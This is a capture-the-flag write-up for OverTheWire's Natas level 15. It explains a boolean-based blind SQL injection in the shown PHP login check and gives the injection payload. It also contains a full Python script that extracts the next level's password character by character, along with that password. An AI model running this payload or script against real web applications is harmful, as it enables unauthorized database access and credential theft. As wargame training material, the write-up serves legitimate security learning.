# Natas Level 15

> Username: natas15
> Password: GB6USCJYJjwLyYhZUNkE1NwDueiTow6g
> URL: http://natas15.natas.labs.overthewire.org

## Solution

Entering the URL, we found a field where we could enter a username and check whether or not it exists. As always we can view the source code to see the vulnerability.

```php
<?php
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>
```

When we enter the username it returns one of three messages:

```php
if(mysqli_num_rows($res) > 0) {
    echo "This user exists.<br>";
} else {
    echo "This user doesn't exist.<br>";
}
```

This is the vulnerability's key feature: the server tells us whether a condition is true or false, even though it doesn't show us the password. And this is a type of `SQL Injection` called `Boolean-based blind SQL injection`.

Where we can ask the database questions to find the password for the exciting user `natas16`. 

Like: Does the password for natas16 start with the letter a?
If the server says `This user exists.`, your guess was correct.
If it says `This user doesn't exist.`, your guess was wrong.

You can try it by inject this payload into the username field:
`natas16" AND password LIKE BINARY "a%" #`

Manually guessing every character would take a long time. So we have to write a script to automate this process.

```python
import requests
import string

url = "http://natas15.natas.labs.overthewire.org/"

# Credentials for accessing the Natas15 challenge page
auth = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")

characters = string.ascii_letters + string.digits
password = ""

session = requests.Session()
session.auth = auth

for position in range(32):
    for char in characters:
        guess = password + char

        payload = f'natas16" AND password LIKE BINARY "{guess}%" #'

        response = session.get(
            url,
            params={
                "username": payload
            }
        )

        if "This user exists." in response.text:
            password += char
            print("Found:", password)
            break
    else:
        print("No matching character found at position", position + 1)
        break

print("Password:", password)
```

Running it we will have something like:

```text
Found: X
Found: Xm
Found: Xm6
Found: Xm6X
Found: Xm6XE
Found: Xm6XEe
Found: Xm6XEeR
Found: Xm6XEeRN
Found: Xm6XEeRN3
Found: Xm6XEeRN3z
Found: Xm6XEeRN3zs
Found: Xm6XEeRN3zsG
Found: Xm6XEeRN3zsGj
Found: Xm6XEeRN3zsGjR
Found: Xm6XEeRN3zsGjRD
Found: Xm6XEeRN3zsGjRDq
Found: Xm6XEeRN3zsGjRDqB
Found: Xm6XEeRN3zsGjRDqBP
Found: Xm6XEeRN3zsGjRDqBPm
Found: Xm6XEeRN3zsGjRDqBPmu
Found: Xm6XEeRN3zsGjRDqBPmuq
Found: Xm6XEeRN3zsGjRDqBPmuqA
Found: Xm6XEeRN3zsGjRDqBPmuqAV
Found: Xm6XEeRN3zsGjRDqBPmuqAVV
Found: Xm6XEeRN3zsGjRDqBPmuqAVV6
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k7
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3G
Found: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
Password: Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

```text
Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb
```

